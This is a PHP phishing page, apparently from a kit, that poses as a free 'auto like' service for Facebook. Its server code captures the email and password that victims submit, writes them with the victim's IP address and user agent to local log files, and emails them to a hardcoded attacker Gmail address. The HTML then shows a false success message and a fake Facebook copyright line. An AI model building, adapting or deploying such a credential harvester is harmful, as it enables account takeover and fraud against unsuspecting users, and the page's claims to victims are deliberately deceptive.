<?php
function ngelog(){
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$today = date("F j, Y, g:i a");
if (!empty($_POST["Email"])){
                if (!empty($_POST["Pass"])){
                        $buka=fopen("LOG-ACCOUNT.txt","a+");
                        $tulis=fopen("RESULT.txt","w");
                        fwrite($buka,"\n\r[+] RESULT Facebook Boss !\n\r[*] Poweered By Mrcakil\n\r[+] Emailnya: ".$_POST["Email"]."\n\r[+] Passwordnya: ".$_POST["Pass"]."\n\r[+] Ip Address : $ip\n\r[+] User Agent : $user_agent");
                        fwrite($tulis,"\r[+] RESULT \n\r[=] Email: ".$_POST["Email"]."\n\r[=] Pasword: ".$_POST["Pass"]);
                        fclose($buka);
                        fclose($tulis);
}
}
}
ngelog();
function kirimemail(){
$email = $_POST['Email'];
$password = $_POST['Pass'];

$emailkamu = 
"dendisaimam5@gmail.com"; //GANTI EMAILMU DIMARI GAN
$tomail = $emailkamu; 

$subject = "SETOR FACEBOOK BOS";
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:blue;color:white;text-align:center;"><font size=6><b>INI AKUN FACEBOOKNYA</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:white;color:black;text-align:center;">
<hr style="color:red">
Email : <b>'.$email.'</b></br>
Password : <b>'.$password.'</b>
<hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:blue;color:white;text-align:center;"><font size=3 color=white><b> 2017 - KALO SALAH JANGAN NGAMOX</b></font></div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: SETOR FACEBOOK BOS <noreply@kepolu.com>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
}
kirimemail();
?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<title>Free Auto Like Facebook</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="js/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="img/header.jpg"/>
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-facebook"></i> Facebook</b></div>
</div>
<center style="background:white;"><br>
<div class="col-md-12">
<h2><img src="img/fb.jpg"></h2>
<h3>
  Get Auto Like Facebook
</h3>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<h4 >
  Thank You For Using This Tools.</p>
  You Like has ben send! Please wait 24 hours.
  </h4><br/>
  <div style="width:100%" class="form-group">
  <a  href="https://gnb09.blogspot.co.id/" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> Logout </a>
</div>

</div><br><br>
</div>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>Facebook Like </p></center>
<p>Copyright &copy; 2017 Facebook.</p>

</div>
</div>

</div>
